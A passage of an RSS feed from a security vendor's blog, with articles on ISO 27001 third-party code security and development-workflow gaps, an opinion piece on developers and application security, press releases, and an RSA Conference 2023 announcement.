+<p>The collaborative nature of modern software is clearly recognized in the updated International Standards Organization (ISO) 27001/27002 standards, which require organizations to “identify and implement processes and procedures to address security risks associated with the use of products and services provided by suppliers.” Although this is a daunting task, the ISO 27001 information security, cybersecurity, and privacy protection standard and its companion document, ISO 27002, both <a href="https://www.invicti.com/blog/web-security/iso-27001-27002-changes-in-2022-application-security-vulnerability-scanning/">updated in October 2022</a>, lay out guiding principles for protecting outsourced and third-party code as well as cloud services.&nbsp;</p>
+
+
+
+<h2><strong>Third-party software still needs security testing</strong></h2>
+
+
+
+<p>It makes sense for an organization to use third-party libraries for common tasks such as handling network operations or rendering the user interface. Such pre-written code usually is stable, debugged, and ready to run. But widely-used code can also make an easy target for attackers looking for a big payback on their efforts. Fortunately, the security community continually monitors popular platforms and software for weaknesses or security breaches. ISO recommends that organizations keep an eye on disclosures and apply patches and updates promptly when available. Regression testing must follow to verify that existing code still works as intended.&nbsp;</p>
+
+
+
+<p>“Nevertheless, an organization cannot accept third-party software as-is,” warns Invicti CISO and VP of Information Security Matthew Sciberras. “They must perform security testing. SAST works well for open-source code, but for libraries accessed through an API where the source is unavailable, automated DAST and manual penetration testing are the only options,” he says. (SAST and DAST standing for <a href="https://www.invicti.com/learn/static-application-security-testing-sast/">static application security testing</a> and <a href="https://www.invicti.com/learn/dynamic-application-security-testing-dast/">dynamic application security testing</a>, respectively.)</p>
+
+
+
+<h2><strong>ISO 27002 details requirements for outsourced code</strong></h2>
+
+
+
+<p>The advantages to outsourcing development are many, but the main advantage is that the outsourcing supplier can contribute skills lacking in your organization. As with code developed in-house, however, that outsourced code can carry security risks. Recognizing that the responsibility for protecting data remains with the organization, ISO 27002 stipulates a set of requirements for all stages of outsourced development.&nbsp;</p>
+
+
+
+<p>The first step ISO recommends is researching the outsourcing supplier: its reputation, documentation, and certifications. Special attention should be paid to security practices, given that the supplier will have access to your organization’s data.&nbsp;</p>
+
+
+
+<p>Next, it’s time to negotiate a strong contract. ISO says the contract should clearly delineate the responsibilities of both parties, including non-disclosure agreements where appropriate. The contract should also establish ownership of the completed code and intellectual property. Procedures and policies for secure design, coding, and testing should also be written into the contract, with an option to audit those procedures.</p>
+
+
+
+<p>Access control is another crucial consideration. During development, the organization should provide the appropriate access level for any resources needed by the supplier, and both parties should establish secure procedures for code delivery. At termination of the contract, whether by delivery of the software or failure of the outsourcing company to comply with its terms, your organization should remove any access rights granted to the supplier, and the supplier should destroy all copies of the organization’s data and return any assets. And if at any time the outsourcing supplier becomes aware of a data breach involving its code, it should be contractually obligated to promptly notify your organization and work with you to remedy the situation.</p>
+
+
+
+<p>Both the supplier and your organization should perform security testing. SAST can be used during development because you will have access to the source code, but DAST is also essential both during development and after deployment. Once the code is deployed, you should continue to monitor the supplier’s security procedures and practices to keep up with any reported vulnerabilities affecting third-party software used in the supplier’s code.</p>
+
+
+
+<h2><strong>Cloud services requirements in ISO 27002</strong></h2>
+
+
+
+<p>When it comes to cloud infrastructure, ISO 27002 requires an organization to negotiate a special agreement with its cloud service provider. In the agreement, the cloud service provider should be required to use industry-standard architecture and infrastructure. It must also protect your organization’s data by applying secure access controls and ensuring appropriate handling of any sensitive data.</p>
+
+
+
+<p>Cloud service provider obligations should also include monitoring for intrusions and malware as well as ensuring dedicated support in gathering evidence should a breach occur. If the provider subcontracts any of its services, the same contractual terms need to be applied to subcontractors. To cover the entire lifecycle, at contract termination, the provider must return all data and configuration files to the organization and properly remove your data from its systems.</p>
+
+
+
+<h2><strong>The bottom line</strong></h2>
+
+
+
+<p>In the end, each organization is responsible for the confidentiality, integrity, and availability of its data – and that of its customers. Regardless of whether the software you use and the platform it runs on originate from your organization, a cloud provider, or an outsourced supplier or another third party, it’s you who must ensure the code is secure. One aspect of this is negotiating contractual agreements with outsourcing suppliers and cloud services. But the final assurance that the software is secure must come from security testing – and that means SAST where you have the source code and DAST everywhere, both during development and after deployment.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/securing-third-party-code-for-iso-27001-compliance/">All your code is not your own: Securing third-party code for ISO 27001 compliance</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Invicti Announces Climb Channel Solutions as First UK Distribution Partner</title>
+      <link>https://www.invicti.com/blog/news/invicti-announces-climb-channel-solutions-as-first-uk-distribution-partner/</link>
+      <dc:creator><![CDATA[Chelsea Glosser]]></dc:creator>
+      <pubDate>Tue, 28 Mar 2023 10:00:21 +0000</pubDate>
+      <category><![CDATA[News]]></category>
+      <category><![CDATA[channel]]></category>
+      <category><![CDATA[news]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39289</guid>
+      <description><![CDATA[<p>Invicti Security has announced its partnership with Climb Channel Solutions, a global specialty IT distributor focused on the UK and Irish markets. Climb will deliver the full Invicti product portfolio and has technical, pre- and post-sales support on the partnership roadmap.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/news/invicti-announces-climb-channel-solutions-as-first-uk-distribution-partner/">Invicti Announces Climb Channel Solutions as First UK Distribution Partner</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p class="has-text-align-center"><em><strong>Climb portfolio to include AppSec with zero noise solution</strong></em></p>
+
+
+
+<p><strong>LONDON, March 28, 2023</strong> – <a href="https://www.invicti.com/">Invicti Security<img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /></a> today announced its partnership with Climb Channel Solutions, a global specialty IT distributor. With a primary focus on the UK and Irish markets, Climb will deliver Invicti’s full product portfolio in addition to having technical, pre- and post-sales support on the partnership roadmap.&nbsp;</p>
+
+
+
+<p>Invicti – which acquired and combined AppSec solutions Acunetix and Netsparker under its brand name – delivers continuous application security with zero noise, designed to be reliable for security, practical for development, and serve critical compliance requirements. Leveraging dynamic application security (DAST), software composition analysis (SCA), and interactive application security (IAST) to provide the greatest testing accuracy, coverage, and speed, Invicti enables companies to better secure and ultimately reduce risk across their web applications and APIs.</p>
+
+
+
+<p>“There’s a massive opportunity for Invicti and our partners in these regions. Our partnership with Climb not only plays an important role in our growth into new verticals and geographies, but it upholds our commitment to providing our partners and customers with best-in-DAST solutions,” said Daniela Streng, Senior Vice President Sales, Invicti.</p>
+
+
+
+<p>“This relationship helps us deliver on our commitment of helping our broad range of international partners and customers secure their company’s most important assets,” said Jane Silk, Vice President Sales, EMEA, Climb Channel solutions. “By partnering with Invicti and offering their leading AppSec solutions, we can better help DevSecOps teams meet the increasingly critical demand for finding and remediating web vulnerabilities.”</p>
+
+
+
+<p>You can learn more about Invicti and Climb Channel solutions’ partnership <a href="https://www.climbcs.co.uk/vendors/invicti/" target="_blank" rel="noreferrer noopener nofollow">here</a>.</p>
+
+
+
+<p><strong>About Invicti Security</strong></p>
+
+
+
+<p><a href="https://www.invicti.com/">Invicti Security</a> – which acquired and combined DAST leaders Acunetix and Netsparker – is on a mission: application security with zero noise. An AppSec leader for more than 15 years, Invicti&#8217;s best-in-DAST solutions enable DevSecOps teams to continuously scan web applications, shifting both left and right to identify, prioritize and secure a company&#8217;s most important assets. Our commitment to accuracy, coverage, automation, and scalability helps mitigate risks and propel the world forward by securing every web application. Invicti is headquartered in Austin, Texas, and has employees in over 11 countries serving more than 4,000 organizations around the world. For more information, visit our <a href="https://www.invicti.com/">website</a> or follow us on <a href="https://www.linkedin.com/company/invicti-security/">LinkedIn</a>. </p>
+
+
+
+<p><strong>About Climb Channel Solutions and Climb Global Solutions</strong>&nbsp;<br></p>
+
+
+
+<p>Climb Channel Solutions is a global specialty IT distributor for emerging technology vendors with solutions for Security, Data Management, Connectivity, Storage &amp; HCI, Virtualization &amp; Cloud and Software &amp; ALM. Climb provides vendors access to thousands of VARs, MSPs, CSPs and other resellers. Climb holds an IT-70 GSA contract vehicle that provides resellers and vendors with a competitive edge within the Public Sector. Climb is a wholly-owned subsidiary of Climb Global Solutions, Inc. (NASDAQ: CLIMB).&nbsp;</p>
+
+
+
+<p><strong>###</strong></p>
+
+
+
+<p>Contact: &nbsp;</p>
+
+
+
+<p>Anne Harding<br>The Message Machine Ltd (PR for Invicti in Europe)<br><a href="mailto:anne@themessagemachine.com" target="_blank" rel="noreferrer noopener">anne@themessagemachine.com</a></p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/news/invicti-announces-climb-channel-solutions-as-first-uk-distribution-partner/">Invicti Announces Climb Channel Solutions as First UK Distribution Partner</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>So your developers don’t care about security? They shouldn’t have to</title>
+      <link>https://www.invicti.com/blog/web-security/developers-shouldnt-have-to-care-about-security-opinion/</link>
+      <dc:creator><![CDATA[Tomasz Andrzej Nidecki]]></dc:creator>
+      <pubDate>Thu, 23 Mar 2023 13:28:38 +0000</pubDate>
+      <category><![CDATA[Web Security]]></category>
+      <category><![CDATA[secure-development]]></category>
+      <category><![CDATA[opinion]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39210</guid>
+      <description><![CDATA[<p>When Mark Curphey recently blogged that developers cannot and will not care about security even though “AppSec people have been complaining for years that security should be a priority for all developers,” we (as the AppSec people) had to react – and found that we agree with him on nearly all counts.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/developers-shouldnt-have-to-care-about-security-opinion/">So your developers don’t care about security? They shouldn’t have to</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p class="has-text-align-left"><em>Say your company is fully committed to web application security. You have lots of security tools, you scan for vulnerabilities on a regular basis, and you’ve invested in educating your developers about SQLi, XSS, RCE, and other weaknesses. And yet – even in new code, your scanners keep finding the same vulnerabilities. Your application security is either not improving or is improving far too slowly. What is going wrong?</em></p>
+
+
+
+<p><strong style="color:#1665fb">OPINION</strong> I recently came across a no-holds-barred <a href="https://blog.crashoverride.com/developers-only-pay-lip-service-to-security.-get-over-it" target="_blank" rel="noreferrer noopener nofollow">post by Mark Curphey</a>. Based on his extensive experience in managing security and development, Mark states bluntly that “the vast majority of developers don’t care about security” and that educating them will not help. He even goes on to say that “‘developer education and awareness is the key’ and similar phrases are muttered at security conferences everywhere.” Ouch. I confess that’s also been muttered here at Invicti more than once.&nbsp;</p>
+
+
+
+<p>Mark’s opinion comes straight from the source and is based on real experiences. And while I’m not as pessimistic as he is, he makes some valid and important points that we need to expand on.</p>
+
+
+
+<h2>“I had to ship features or my boss would get mad”</h2>
+
+
+
+<p>Even with extensive developer education and the best intentions of the developers, security will not be a priority if management does not prioritize it. If developers are under pressure to deliver features and are not given the time and resources to incorporate security, they will ignore security – simple as that. Their management may also believe that secure development means spending an extra five minutes when reviewing the code. If management had ever tried to build effective XSS filter routines on their own, they might realize that it’s not five minutes but closer to the fate of Sisyphus.</p>
+
+
+
+<p>It takes a significant amount of time and effort to secure software. Everyone in a development organization needs to understand this, remember it, and consider it in all and any development plans. If this isn’t done, don’t blame the developers. Anyone who pushes for quick releases before they are ready also needs to take responsibility for any security flaws in your applications.</p>
+
+
+
+<h2>“All developers will do the right thing if it solves a problem that they have”</h2>
+
+
+
+<p>Mark goes on to make a point that the AppSec mutterers among us can only wholeheartedly agree with:</p>
+
+
+
+<blockquote class="wp-block-quote is-style-default">
+<p><em>“If you want to improve application security (&#8230;), stop trying to make developers care, accept they don’t, and start deploying solutions that solve a problem that they care about that as a side effect improves security or allows you to tag security on later.”</em></p>
+</blockquote>
+
+
+
+<p>There’s no question that if you want secure software, you must empower your developers to build it. How? By giving them the appropriate development and security tools that they can use without messing up their workflows. For example, many frameworks include secure functionality for user input processing, and standardizing on using these features will eliminate the causes of most injection vulnerabilities.</p>
+
+
+
+<p>Such decisions are primarily for software architects and those overseeing high-level design and development decisions. Faced with tickets and sprint deadlines, your development teams on the ground will not be rushing to find secure solutions, such as a library to filter user input or introduce parameterized queries. But if you prepare for this in advance, you can instruct them to use specific programming language elements. For example, you can build an internal library that uses tools such as ESAPI or AntiXSS and prepared statements for all SQL queries, and instruct developers to use only that library for any input processing.</p>
+
+
+
+<p>In fact, I would even go a step further than Mark because humans are inherently lazy – and lazy is good when it saves effort but not so much when it compromises security. Even equipped with the best tools, a developer may go for a less secure solution if it’s simpler. So there must be a stick in addition to the carrot. Block constructs such as <code>eval</code> and <code>shell_exec</code>. Add <code>allow_url_include = Off</code> to your <em>php.ini</em>. Disable all unnecessary URL schemas. And last but not least, enforce a security scan after every commit and make passing it a requirement. Do whatever it takes to minimize security risks at every step of the pipeline – and if developers object, show them secure and practical ways of resolving issues and avoiding them in the future.</p>
+
+
+
+<h2>“Get over it and move on”</h2>
+
+
+
+<p>Though admittedly in very different words, Mark echoes the message we’ve been trying to get across for years: that application security tools must not get in the way:</p>
+
+
+
+<blockquote class="wp-block-quote is-style-default">
+<p><em>“I think we should accept that developers only pay lip service to security, get over it, and develop security solutions that first and foremost solve a problem that developers have. (&#8230;) Getting over it and moving on doesn’t mean you can’t still enable developers to build secure software, it just means you take a different, less direct approach.”</em></p>
+</blockquote>
+
+
+
+<p>I’ve written before about the reasons <a href="https://www.acunetix.com/blog/web-security-zone/why-developers-shun-security/" target="_blank" rel="noreferrer noopener">why developers shun security</a>, and Mark mentions one typical offender in the form of “useless code review findings filtered from a tool by some intern at an accounting firm playing security consultants on the Internet.” Getting a list of cryptic and questionable findings doesn’t help anyone. Instead, get a helpful tool that, first and foremost, does not bombard developers with false positives. Remember that every false alarm from a security tool brings your developers closer to ignoring security completely. Instead of having them nap during security lectures, give them <a href="https://www.invicti.com/blog/web-security/proof-based-scanning-game-changer-reasons/">proof of a successful exploit</a>, <a href="https://www.invicti.com/white-papers/changing-the-dast-game-with-invicti-iast-white-paper/">show them where</a> the vulnerability was introduced, and <a href="https://www.invicti.com/learn/">teach them practically</a> how to fix security bugs right away.</p>
+
+
+
+<p>Yes, Mark, let’s move on. And, as we move forward, let’s make sure the tools we use to assess application security solve the developers’ problems rather than adding to them.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/developers-shouldnt-have-to-care-about-security-opinion/">So your developers don’t care about security? They shouldn’t have to</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Invicti exhibiting at RSA Conference 2023</title>
+      <link>https://www.invicti.com/blog/news/invicti-exhibiting-at-rsa-conference-2023/</link>
+      <dc:creator><![CDATA[Saran Toure]]></dc:creator>
+      <pubDate>Wed, 22 Mar 2023 16:49:10 +0000</pubDate>
+      <category><![CDATA[News]]></category>
+      <category><![CDATA[rsa-conference]]></category>
+      <category><![CDATA[events]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39193</guid>
+      <description><![CDATA[<p>This blog post announces our sponsorship of RSA Conference 2023, taking place on April 24th–27th. We would like to invite you to a talk by Patrick Vandenberg on vulnerability trends and improving AppSec programs.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/news/invicti-exhibiting-at-rsa-conference-2023/">Invicti exhibiting at RSA Conference 2023</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p>We’re thrilled to once again be exhibiting at RSAC 2023. This event is undoubtedly one of the largest in the industry, convening thousands of innovators in cybersecurity from around the world to share perspectives that spark new ideas. With its theme of “Stronger Together,” this year’s RSAC is set to fuel collaborative evolution in cybersecurity at a time of global uncertainty, with organizations worldwide chasing ways to keep up with the threat landscape while also improving efficiencies.</p>
+
+
+
+<p>As always, we’d love to see you there, especially as we’re unveiling a big Invicti surprise this year – so join us at booth N-6265.</p>
+
+
+
+<p><a href="https://www.invicti.com/clp/meet-us-at-rsac-2023/?utm_medium=email&amp;utm_source=blog&amp;utm_campaign=i-RSA2023&amp;utm_content=230300-landing-page&amp;utm_term=brand">Register now</a> to meet our team and ask us how we can help you secure thousands of web assets to dramatically reduce the risk of a successful cyberattack.</p>
+
+
+
+<h2>Learn about trends in real-life web vulnerability testing</h2>
+
+
+
+<p>Without visibility into the web attack surface combined with systematic security testing, any blind spots and weaknesses can put organizations at risk of cyberattacks and breaches. Join us on April 25th at 12:20 PT at the Briefing Center Booth N-6545 as Invicti’s Director of Product Marketing, Patrick Vandenberg, zooms in on security flaw offenders plaguing DevSecOps teams today.</p>
+
+
+
+<p>In this session, you will learn:</p>
+
+
+
+<ul>
+<li>What web vulnerabilities we’re seeing most often across scan results</li>
+
+
+
+<li>How systematic vulnerability scanning correlates with overall application security</li>
+
+
+
+<li>Which web security risks are trending and how zero-noise vulnerability testing can help address them</li>
+</ul>
+
+
+
+<p>We look forward to seeing you there and talking application security – <a href="https://www.invicti.com/clp/meet-us-at-rsac-2023/?utm_medium=email&amp;utm_source=blog&amp;utm_campaign=i-RSA2023&amp;utm_content=230300-landing-page&amp;utm_term=brand">register now</a> to join us at RSAC 2023!</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/news/invicti-exhibiting-at-rsa-conference-2023/">Invicti exhibiting at RSA Conference 2023</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Closing security gaps in development workflows for ISO 27001 compliance</title>
+      <link>https://www.invicti.com/blog/web-security/closing-security-gaps-in-development-workflows-iso-27001-compliance/</link>
+      <dc:creator><![CDATA[Andrew Binstock]]></dc:creator>
+      <pubDate>Tue, 21 Mar 2023 16:04:19 +0000</pubDate>
+      <category><![CDATA[Web Security]]></category>
+      <category><![CDATA[secure-development]]></category>
+      <category><![CDATA[iso-27001]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39181</guid>
+      <description><![CDATA[<p>The updated ISO 27001 standard requires IT organizations to define a comprehensive, overarching information security policy that incorporates the entire development workflow. This post examines a few of the challenges in securing the development process.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/closing-security-gaps-in-development-workflows-iso-27001-compliance/">Closing security gaps in development workflows for ISO 27001 compliance</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<blockquote class="wp-block-quote is-style-default">
+<p><strong>Key takeaways</strong></p>
+
+
+
+<p>&nbsp;</p>
+
+
+
+<ul>
+<li>Software development and deployment involve multiple, often complex steps that can create opportunities for malware or vulnerabilities to enter a system and go undetected.</li>
+
+
+
+<li>Gaps in security can occur because of lax security enforcement, underappreciation of the possible risks a procedure or IT asset poses, or insufficient security testing coverage.</li>
+
+
+
+<li>The best protection comes from incorporating the entire development workflow and infrastructure into a detailed IT security plan that is enforced, monitored, and regularly updated.</li>
+</ul>
+</blockquote>
+
+
+
+<p>The single most devastating cyberattack on US government agencies and major software companies – yes, the 2020 <a href="https://www.invicti.com/blog/web-security/solarwinds-hack-cybersecurity-lessons/">SolarWinds breach</a> – was the result of attackers hijacking part of the software development supply chain of a third-party tools firm. Similar attacks against open-source projects have been successful as well, such as the one involving the NetBeans Java development environment, which for years <a href="https://duo.com/decipher/malware-infects-netbeans-projects-in-software-supply-chain-attack" target="_blank" rel="noreferrer noopener nofollow">unwittingly shipped malware</a> that had been introduced into its build system. </p>
+
+
+
+<p>The bigger point, which is undeniably as timely and relevant as ever, is that every organization that develops software must develop a policy to secure its development pipeline. That holds true whether the software is meant for internal use or for customer-facing purposes, and it also covers web applications and mobile apps. The ISO 27001 standard, updated in late 2022, is an excellent starting point for understanding how to develop the protection orientation and policy for software development and, by extension, other IT activities.</p>
+
+
+
+<p>The standard – specifically its <a href="https://www.isms.online/iso-27001/6-2-establishing-measurable-information-security-objectives/" target="_blank" rel="noreferrer noopener nofollow">Requirement 6.2</a> – calls for the development of a comprehensive, overarching information security policy and “applicable” objectives, “taking into account the information security requirements, results from risk assessment, and treatment.” Objectives should be measurable, monitored, communicated, updated, and made available as documented information, the ISO standard makes clear. When implementing policy changes, the IT organization must determine “what will be done, what resources will be required, who will be responsible, when it will be completed, and how the results will be evaluated.”</p>
+
+
+
+<p>As these steps illustrate, the standard is not an abstract normative document but rather a framework that requires active implementation. ISO 27001 makes clear that implementation of the security policy must be a living process that is properly communicated, enforced, and updated. Such vigilance can help staff spot and immediately address unanticipated gaps in security coverage and staff knowledge.&nbsp;&nbsp;</p>
+
+
+
+<p>So what kind of gaps in security coverage are we talking about?</p>
+
+
+
+<h2><strong>Where does your code come from?</strong></h2>
+
+
+
+<p>Developers frequently search the web for answers to coding problems they encounter – problems as simple as how to use a data structure in a given language or as complex as how to implement a difficult algorithm. Forums such as <a href="https://stackoverflow.com/" target="_blank" rel="noreferrer noopener nofollow">StackOverflow</a> are popular for these kinds of discussions, where contributors who answer queries will post the full code intended to remedy the problems at hand. In turn, many developers will copy and paste the supplied code, unchanged, into their product code.   </p>
+
+
+
+<p>The possibility of unwittingly copying and pasting malicious code is clearly a serious threat. But there are two other hidden risks. The first has to do with licensing: If the copied code comes from an open-source project, then the code is subject to the terms of an open-source license. In the most harmless scenario, this requires a statement distributed with the product acknowledging that some of its code is used under a specific license. However, if the applicable license is a “copyleft” license (such as the widely used GPL and AGPL licenses), the code of the <em>entire</em> application must be released to all users. Obviously, this requirement could have serious consequences and may rule out some commercial usage. Sophisticated static code analyzers today can spot code that is likely taken from an open-source project. To minimize the risk of non-compliance, a policy must be in place to use such tools on a regular basis across the entire codebase.&nbsp;</p>
+
+
+
+<p>A related threat arises when developers bring in dynamic dependencies that incorporate third-party code into the application. This is a particularly common practice in JavaScript code in web applications. In this setup, the code is brought into the program every time the application is run. While there is a risk that the code could be modified for malicious purposes, it can also be modified with no evil intent and prevent an application from running correctly or even running at all. In an extreme example, back in 2016, a developer <a href="https://qz.com/646467/how-one-programmer-broke-the-internet-by-deleting-a-tiny-piece-of-code" target="_blank" rel="noreferrer noopener nofollow">deleted from his personal repository a simple 11-line function</a> that enabled characters to be added to the start of a string. Thousands of web applications, including some at Facebook, Netflix, and Uber, suddenly stopped working until the deleted lines were restored. </p>
+
+
+
+<h2><strong>Have you tested that app in real life?</strong></h2>
+
+
+
+<p>Developers understand the importance of testing their code: Unit tests, integration tests, and user-acceptance tests are all established practices. But security, if it is to have no gaps, should also test running web applications. <a href="https://www.invicti.com/blog/web-security/how-to-select-dast-scanner/">Dynamic application security testing (DAST) scanners</a> search for entry points, vulnerabilities, and other exploitable weaknesses as the application operates and interacts with users. While DAST tools can and should be run after deployment, restricting them to this stage gives attackers the chance to exploit a vulnerability introduced in a new release. The smarter scenario is to also test each web app in a staging environment that faithfully duplicates the exact deployment environment and allows a DAST tool to search for vulnerabilities before moving into production.</p>
+
+
+
+<p>The issues typically found in such pre-deployment verification, which may not show up even in extensive static testing, represent another gap where unexpected vulnerabilities could occur despite prior testing and code reviews.</p>
+
+
+
+<h2><strong>Eliminating security gaps</strong></h2>
+
+
+
+<p>The security gaps discussed in this article are typical of many development organizations, but dozens more can occur along the software development life cycle. Because these gaps are hard to spot, much less foresee, IT managers are encouraged to use established methodologies to secure their development pipelines. The updated ISO 27001 standard and accompanying ISO 27002 guidelines document present a thorough overview. Companies that are ready to systematize their security may also consider adopting the practices spelled out in <a href="https://csrc.nist.gov/Projects/ssdf" target="_blank" rel="noreferrer noopener nofollow">version 1.1</a> of the US National Institute of Standards and Technology’s Secure Software Development Framework, which can help <a href="https://www.invicti.com/blog/web-security/using-secure-software-development-frameworks-to-build-better-software/">close many security weaknesses</a>.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/web-security/closing-security-gaps-in-development-workflows-iso-27001-compliance/">Closing security gaps in development workflows for ISO 27001 compliance</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Award Wins Showcase Invicti Security’s Early Momentum in 2023</title>
+      <link>https://www.invicti.com/blog/news/award-wins-showcase-invicti-security-early-momentum-in-2023/</link>
+      <dc:creator><![CDATA[Chelsea Glosser]]></dc:creator>
+      <pubDate>Mon, 20 Mar 2023 13:04:39 +0000</pubDate>
+      <category><![CDATA[News]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39160</guid>
+      <description><![CDATA[<p>Invicti Security announces momentum-building success in 2023 as it garners multiple industry awards spotlighting its products and leadership, including Best Application Security Product, Cybersecurity Woman of the Year, and Chief Technology Officer of the Year.</p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/news/award-wins-showcase-invicti-security-early-momentum-in-2023/">Award Wins Showcase Invicti Security’s Early Momentum in 2023</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></description>
+      <content:encoded><![CDATA[
+<p><strong>AUSTIN, Texas – (March 20, 2023) – </strong><a href="https://www.invicti.com/about/">Invicti Security<img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /></a> today announced momentum-building success in 2023, as the company touts receipt of multiple awards spotlighting its products, growth, leadership, and corporate culture. With the need for enhanced cybersecurity at an all-time high, Invicti supports its customers by delivering world-class customer experiences and products that provide AppSec with zero noise.</p>
+
+
+
+<p>In the first quarter of 2023, Invicti received three <a href="https://cybersecurity-excellence-awards.com/" target="_blank" rel="noreferrer noopener nofollow">Cybersecurity Excellence Awards</a>. These awards recognize companies, products, and professionals that demonstrate excellence, innovation, and leadership in information security. Invicti received the following:</p>
+
+
+
+<ul>
+<li><em>Best Application Security Product / Service</em>: <a href="https://cybersecurity-excellence-awards.com/candidates/invicti-security/" target="_blank" rel="noreferrer noopener nofollow">Invicti Security</a>, Silver Award recipient</li>
+
+
+
+<li><em>Cybersecurity Woman of the Year</em>: <a href="https://cybersecurity-excellence-awards.com/candidates/sonali-shah/" target="_blank" rel="noreferrer noopener nofollow">Sonali Shah</a>, Invicti Chief Product Officer, Gold Award recipient</li>
+
+
+
+<li><em>Chief Technology Officer of the Year</em>: <a href="https://cybersecurity-excellence-awards.com/candidates/frank-catucci/" target="_blank" rel="noreferrer noopener nofollow">Frank Catucci</a>, Invicti Chief Technology Officer and Head of Security Research, Gold Award recipient</li>
+</ul>
+
+
+
+<p>The company was also named the <a href="https://event.computing.co.uk/devopsawards2023/en/page/2023-winners" target="_blank" rel="noreferrer noopener nofollow">Best DevOps Security Tool</a> by the <a href="https://event.computing.co.uk/devopsawards2023/en/page/home" target="_blank" rel="noreferrer noopener nofollow">DevOps Excellence Awards</a>, which celebrate the achievements of companies and individuals who are pushing the boundaries of DevOps. Invicti was also recognized for its tremendous growth in 2022 – 115 percent – and was named to the <a href="https://www.inc.com/regionals/southwest" target="_blank" rel="noreferrer noopener nofollow">Inc. Regionals 2023: Southwest</a> list. Company leadership says these accolades early into 2023 are only the beginning.</p>
+
+
+
+<p>“Supporting and securing more than 4,000 organizations and growing worldwide, we’ve just scratched the surface of what’s possible,” says Invicti CEO Michael George. “We are honored and humbled by these recent awards from such prestigious authorities. This recognition signifies our company’s successful pursuit of propelling the world forward by securing every web application and API. This year, we’re already off to an amazing start.”</p>
+
+
+
+<p>Invicti was also named to <a href="https://builtin.com/awards/austin/2023/best-places-to-work" target="_blank" rel="noreferrer noopener nofollow">Built In&#8217;s 2023 Best Places To Work</a> list earlier this year.</p>
+
+
+
+<p>“In addition to the best-in-DAST solution, we also have a remarkably talented team dedicated to advancing our innovation. We are committed to building a culture where the best and brightest security professionals thrive,” added George. “We are excited about what Team Invicti can accomplish with our mission-driven culture of excellence.&#8221;</p>
+
+
+
+<p>To learn more about Invicti or explore career opportunities, click <a href="https://www.invicti.com/careers/">here</a>.&nbsp;</p>
+
+
+
+<p><strong>About Invicti Security</strong></p>
+
+
+
+<p><a href="https://www.invicti.com">Invicti Security</a> – which acquired and combined respective DAST leaders Acunetix and Netsparker – is on a mission: application security with zero noise. An AppSec leader for more than 15 years, Invicti&#8217;s best-in-DAST solutions enable DevSecOps teams to continuously scan web applications, shifting both left and right to identify, prioritize and secure a company&#8217;s most important assets. Our commitment to accuracy, coverage, automation, and scalability helps mitigate risks and propel the world forward by securing every web application. Invicti is headquartered in Austin, Texas, and has employees in over 11 countries serving more than 4,000 organizations around the world. For more information, visit our <a href="https://www.invicti.com">website</a> or follow us on <a href="https://www.linkedin.com/company/invicti-security/" target="_blank" rel="noreferrer noopener nofollow">LinkedIn</a>.</p>
+
+
+
+<p>###</p>
+
+
+
+<p><strong>Media contact:</strong></p>
+
+
+
+<p>Chelsea Glosser<br>Invicti Security<br><a href="mailto:chelsea.glosser@invicti.com">chelsea.glosser@invicti.com</a></p>
+<p>The post <a rel="nofollow" href="https://www.invicti.com/blog/news/award-wins-showcase-invicti-security-early-momentum-in-2023/">Award Wins Showcase Invicti Security’s Early Momentum in 2023</a> appeared first on <a rel="nofollow" href="https://www.invicti.com">Invicti</a>.</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>What’s coming in the OWASP API Security Top 10 for 2023</title>
+      <link>https://www.invicti.com/blog/web-security/whats-coming-in-owasp-api-security-top-10-for-2023/</link>
+      <dc:creator><![CDATA[Zbigniew Banach]]></dc:creator>
+      <pubDate>Fri, 17 Mar 2023 17:18:38 +0000</pubDate>
+      <category><![CDATA[Web Security]]></category>
+      <category><![CDATA[api-security]]></category>
+      <category><![CDATA[web-api]]></category>
+      <category><![CDATA[owasp-top-10]]></category>
+      <guid isPermaLink="false">https://www.invicti.com/?p=39137</guid>
